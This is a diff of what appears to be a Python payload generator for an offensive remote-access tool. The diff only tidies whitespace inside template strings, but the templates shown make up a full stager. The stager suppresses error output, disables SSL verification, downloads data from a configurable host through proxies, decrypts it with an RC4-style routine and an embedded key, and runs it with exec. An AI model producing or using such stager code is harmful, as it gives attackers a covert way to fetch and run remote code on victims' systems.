@@ -43,7 +43,7 @@ def except_hook(**args):
 sys.excepthook = except_hook
 sys.stderr = Dnull()
 sys.tracebacklimit = 0
-        '''
+'''
         self.funcs.append('''
 def f(d, e):
     a, b, c = list(range(256)), 0, []
@@ -56,8 +56,7 @@ def f(d, e):
         b = (b + a[i]) % 256
         a[i], a[b] = a[b], a[i]
         c.append(chr(char ^ a[(a[i] + a[b]) % 256]))
-    return c
-        ''')
+    return c''')
 
         self.ssl_ignore = '''
 import ssl
@@ -79,13 +78,11 @@ r.add_header("{h.split(":")[0]}","{h.split(":")[1]}")
 with urllib.request.urlopen(r) as response:
     g = response.read()
     h = f(g[4:], g[:4] + '{key}'.encode('UTF-8'))
-    exec(''.join(h))
-            '''
+    exec(''.join(h))'''
         else:
             if 'default' in proxies:
                 self.request = '''
-ph = urllib.request.ProxyHandler()
-                '''
+ph = urllib.request.ProxyHandler()'''
             else:
                 self.request = '''
 ph = urllib.request.ProxyHandler({'''
@@ -113,14 +110,12 @@ ph = urllib.request.ProxyHandler({'''
             self.request += f'''
 o = urllib.request.build_opener(ph)
 o.addheaders = {hs}
-request = urllib.request.Request('{host}{path}')
-            '''
+request = urllib.request.Request('{host}{path}')'''
             self.request += f'''
 with o.open(request) as response:
     g = response.read()
     h = f(g[4:], g[:4] + '{key}'.encode('UTF-8'))
-    exec(''.join(h))
-'''
+    exec(''.join(h))'''
 
     def gen(self):
         random.shuffle(self.funcs)
